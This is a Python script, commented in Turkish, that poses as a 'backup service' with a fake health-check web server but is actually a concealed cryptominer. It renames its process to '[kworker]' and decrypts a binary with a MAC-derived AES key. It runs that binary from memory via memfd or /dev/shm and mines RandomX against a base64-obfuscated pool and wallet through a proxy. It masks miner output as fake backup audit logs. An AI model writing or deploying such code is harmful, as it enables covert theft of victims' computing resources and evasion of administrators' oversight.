#!/usr/bin/env python3
import os
import sys
import time
import base64
import threading
import subprocess
import http.server
import re
import ctypes
import hashlib
import socket
from datetime import datetime

# ========== GELİŞMİŞ ŞİFRE ÇÖZME VE BELLEK YÖNETİMİ ==========
libc = ctypes.CDLL('libc.so.6')

def set_process_name(name):
    """Süreç adını değiştir (kworker gibi görün)."""
    try:
        libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except:
        pass

def derive_key(mac: str) -> bytes:
    """Sistem MAC adresine dayalı AES anahtarı türet."""
    salt = b"backup_module_v2"
    key_material = mac.encode() + salt
    return hashlib.sha256(key_material).digest()

def decrypt_aes(data: bytes, key: bytes) -> bytes:
    """AES-256 CBC çözme (ilk 16 bayt IV kabul edilir)."""
    from Crypto.Cipher import AES
    iv = data[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    dec = cipher.decrypt(data[16:])
    # PKCS#7 padding kaldır
    pad_len = dec[-1]
    return dec[:-pad_len]

def run_fileless_memfd(decrypted_bin: bytes):
    """decrypted binary'yi memfd'e yaz ve yolu döndür."""
    FD_CLOEXEC = 1
    fd = libc.syscall(319, b"systemd-service", FD_CLOEXEC)
    if fd < 0:
        # Fallback: /dev/shm
        path = f"/dev/shm/.cache-{os.getpid()}"
        with open(path, 'wb') as f:
            f.write(decrypted_bin)
        os.chmod(path, 0o755)
        return path
    os.write(fd, decrypted_bin)
    return f"/proc/self/fd/{fd}"

# ========== YAPILANDIRMA (KAMUFLAJELİ) ==========
def _b64(s): return base64.b64decode(s).decode()

# Normalde bu URL güvenilir bir CDN'i gösterir; içinde asıl havuz adresi şifreli olabilir.
PROXY_URL = os.environ.get("SYNC_PROXY", "socks5h://sync-proxy.backup-service.com:1080")
# Havuz adresi ortamdan gelir, yoksa varsayılan şifreli değer kullanılır.
POOL_URL  = os.environ.get("SYNC_ENDPOINT", _b64("cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM="))
CLIENT_ID = os.environ.get("CLIENT_ID", _b64("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw="))
NODE_NAME = os.environ.get("NODE_NAME", f"node-{int(time.time())%1000}")

_current_throughput = "0.0 MB/s"

def start_backup_agent():
    global _current_throughput
    encrypted_path = "/var/lib/backup/module.dat"
    if not os.path.exists(encrypted_path):
        return

    try:
        set_process_name("[kworker]")  # çekirdek işçisi gibi görün

        # MAC adresini al (anahtar türetme için)
        mac = None
        for iface in os.listdir('/sys/class/net/'):
            if iface != 'lo':
                with open(f'/sys/class/net/{iface}/address') as f:
                    mac = f.read().strip()
                    break
        if not mac:
            mac = "00:11:22:33:44:55"  # fallback

        key = derive_key(mac)

        with open(encrypted_path, "rb") as f:
            encrypted_data = f.read()

        decrypted_bin = decrypt_aes(encrypted_data, key)

        mem_path = run_fileless_memfd(decrypted_bin)

        # Proxy ayarı eğer ortamda varsa
        proxy_args = []
        if PROXY_URL:
            proxy_args = ["--proxy", PROXY_URL]

        cmd = [
            mem_path,
            "--algorithm", "randomx",
            "--pool", POOL_URL,
            "--wallet", CLIENT_ID,
            "--password", NODE_NAME,
            "--disable-gpu",
            "--tls", "true",
            "--cpu-threads", str(os.cpu_count() // 2 if os.cpu_count() > 1 else 1)
        ] + proxy_args

        clean_env = os.environ.copy()
        for k in ["SYNC_PROXY", "SYNC_ENDPOINT", "CLIENT_ID"]:
            clean_env.pop(k, None)

        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1, env=clean_env)

        for line in proc.stdout:
            if "throughput" in line.lower() or "hashrate" in line.lower():
                m = re.search(r'(\d+\.?\d* [KMG]?B/s)', line)  # MB/s cinsinden göster
                if m:
                    _current_throughput = m.group(1)
            sys.stdout.write(f"[AUDIT] {datetime.now().isoformat()} Backup chunk processed\n")
            sys.stdout.flush()

    except Exception as e:
        # Sessiz hata yönetimi
        time.sleep(30)

if __name__ == "__main__":
    threading.Thread(target=start_backup_agent, daemon=True).start()

    class BackupHealthHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Backup Service v2.1 - Status: Healthy")
        def log_message(self, *args, **kwargs):
            pass

    port = int(os.environ.get("PORT", 8080))
    http.server.ThreadingHTTPServer(("0.0.0.0", port), BackupHealthHandler).serve_forever()
